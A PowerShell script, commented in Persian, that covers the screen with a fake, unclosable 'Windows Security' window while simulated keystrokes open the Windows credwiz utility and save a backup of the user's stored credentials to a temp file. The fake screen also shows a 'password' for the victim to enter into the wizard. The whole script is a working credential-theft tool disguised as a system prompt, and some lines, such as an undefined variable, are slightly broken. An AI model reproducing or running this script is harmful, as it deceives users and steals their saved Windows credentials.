Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$rand = Get-Random
$path = "$env:TEMP\backup$rand"

$form = New-Object System.Windows.Forms.Form -Property @{
    Text = "Windows Security"
    FormBorderStyle = 'None'
    WindowState = 'Maximized'
    TopMost = $true
    BackColor = [System.Drawing.Color]::FromArgb(15, 15, 15)
    StartPosition = "CenterScreen"
    KeyPreview = $true
}

# Main instruction
$labelTitle = New-Object System.Windows.Forms.Label -Property @{
    Text = "To continue, please enter your Windows security Key"
    ForeColor = [System.Drawing.Color]::White
    Font = New-Object System.Drawing.Font("Segoe UI", 24, [System.Drawing.FontStyle]::Bold)
    AutoSize = $true
    BackColor = 'Transparent'
    Location = New-Object System.Drawing.Point(0, 0)
}
$form.Controls.Add($labelTitle)

# Ctrl+Alt+Del instruction
$labelHint = New-Object System.Windows.Forms.Label -Property @{
    Text = "Press Ctrl + Alt + Delete to unlock this screen and enter your password"
    ForeColor = [System.Drawing.Color]::Gray
    Font = New-Object System.Drawing.Font("Segoe UI", 16)
    AutoSize = $true
    BackColor = 'Transparent'
    Location = New-Object System.Drawing.Point(0, 0)
}
$form.Controls.Add($labelHint)

# Token title
$labelTokenTitle = New-Object System.Windows.Forms.Label -Property @{
    Text = "Your Windows security password"
    ForeColor = [System.Drawing.Color]::LightGray
    Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
    AutoSize = $true
    BackColor = 'Transparent'
    Location = New-Object System.Drawing.Point(0, 0)
}
$form.Controls.Add($labelTokenTitle)
$token = $rand[0].ToString()

$password = $token.Substring(0,4)

Write-Output $first4

# Token value
$labelTokenValue = New-Object System.Windows.Forms.Label -Property @{
    Text = "$password"
    ForeColor = [System.Drawing.Color]::White
    Font = New-Object System.Drawing.Font("Segoe UI", 14)
    AutoSize = $true
    BackColor = 'Transparent'
    Location = New-Object System.Drawing.Point(0, 0)
}
$form.Controls.Add($labelTokenValue)

# محاسبه و تنظیم موقعیت کنترل‌ها قبل از نمایش فرم
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds

$labelTitle.Left = ($screen.Width - $labelTitle.Width) / 2
$labelTitle.Top = ($screen.Height / 2) - 100

$labelHint.Left = ($screen.Width - $labelHint.Width) / 2
$labelHint.Top = $labelTitle.Top + 70

$labelTokenTitle.Left = ($screen.Width - $labelTokenTitle.Width) / 2
$labelTokenTitle.Top = $labelHint.Top + 60

$labelTokenValue.Left = ($screen.Width - $labelTokenValue.Width) / 2
$labelTokenValue.Top = $labelTokenTitle.Top + 40

$form.Activate()

# جلوگیری از بسته شدن فرم با Escape و Alt+F4
$form.Add_KeyDown({
    if (($_.KeyCode -eq "F4" -and $_.Alt) -or $_.KeyCode -eq "Escape") {
        $_.Handled = $true
    }
})

$form.Show()

# --------------------------------------
# بخش دوم: کلاس KeyboardSimulator و تابع Run-CredWizAutomation

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class KeyboardSimulator {
    [StructLayout(LayoutKind.Sequential)]
    public struct INPUT {
        public uint type;
        public InputUnion u;
    }
    [StructLayout(LayoutKind.Explicit)]
    public struct InputUnion {
        [FieldOffset(0)] public MOUSEINPUT mi;
        [FieldOffset(0)] public KEYBDINPUT ki;
        [FieldOffset(0)] public HARDWAREINPUT hi;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct MOUSEINPUT {
        int dx, dy, mouseData, dwFlags, time;
        IntPtr dwExtraInfo;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct KEYBDINPUT {
        public ushort wVk, wScan;
        public uint dwFlags, time;
        public IntPtr dwExtraInfo;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct HARDWAREINPUT {
        int uMsg;
        short wParamL, wParamH;
    }

    [DllImport("user32.dll", SetLastError=true)]
    public static extern uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize);

    const int INPUT_KEYBOARD = 1;
    const uint KEYEVENTF_KEYUP = 0x0002;
    const uint KEYEVENTF_UNICODE = 0x0004;

    static INPUT CreateKeyInput(ushort keyCode, bool keyUp) {
        return new INPUT {
            type = INPUT_KEYBOARD,
            u = new InputUnion {
                ki = new KEYBDINPUT {
                    wVk = keyCode,
                    wScan = 0,
                    dwFlags = keyUp ? KEYEVENTF_KEYUP : 0,
                    time = 0,
                    dwExtraInfo = IntPtr.Zero
                }
            }
        };
    }

    public static void SendKey(ushort keyCode) {
        INPUT[] inputs = { CreateKeyInput(keyCode, false), CreateKeyInput(keyCode, true) };
        SendInput(2, inputs, Marshal.SizeOf(typeof(INPUT)));
    }

    public static INPUT KeyDown(ushort keyCode) {
        return CreateKeyInput(keyCode, false);
    }
    public static INPUT KeyUp(ushort keyCode) {
        return CreateKeyInput(keyCode, true);
    }

    public static void SendString(string str) {
        foreach(char c in str) {
            INPUT down = new INPUT {
                type = INPUT_KEYBOARD,
                u = new InputUnion {
                    ki = new KEYBDINPUT {
                        wVk = 0,
                        wScan = c,
                        dwFlags = KEYEVENTF_UNICODE,
                        time = 0,
                        dwExtraInfo = IntPtr.Zero
                    }
                }
            };

            INPUT up = down;
            up.u.ki.dwFlags |= KEYEVENTF_KEYUP;

            SendInput(2, new INPUT[] { down, up }, Marshal.SizeOf(typeof(INPUT)));
            Thread.Sleep(10);
        }
    }

    public static void SendWinRAndRunCredwiz() {
        INPUT[] inputs = new INPUT[] {
            KeyDown(0x5B), KeyDown(0x52), KeyUp(0x52), KeyUp(0x5B)
        };
        SendInput(4, inputs, Marshal.SizeOf(typeof(INPUT)));
        Thread.Sleep(200);
        SendString("credwiz");
        SendKey(0x0D);
        Thread.Sleep(200);
        SendKey(0x0D);
        Thread.Sleep(100);
        SendKey(0x0D);
        Thread.Sleep(200);
    }

    public static void SendStringFromPS(string str) {
        SendString(str);
    }
}
"@

function Run-CredWizAutomation {
    [KeyboardSimulator]::SendWinRAndRunCredwiz()
    Start-Sleep -Milliseconds 500
    [KeyboardSimulator]::SendStringFromPS($path)
    Start-Sleep -Milliseconds 200
    [KeyboardSimulator]::SendKey(0x0D)
    Start-Sleep -Milliseconds 200
    [KeyboardSimulator]::SendKey(0x09)
    [KeyboardSimulator]::SendKey(0x0D)
}

Run-CredWizAutomation

while ($true) {
    if (Test-Path "$path.crd") {
        Write-Output "File exists."
        break
    }
    Start-Sleep -Milliseconds 300

    if (-not (Get-Process -Name "credwiz" -ErrorAction SilentlyContinue)) {
        Run-CredWizAutomation
        Write-Output "credwiz relaunched"
    }
}

$form.Close()
exit
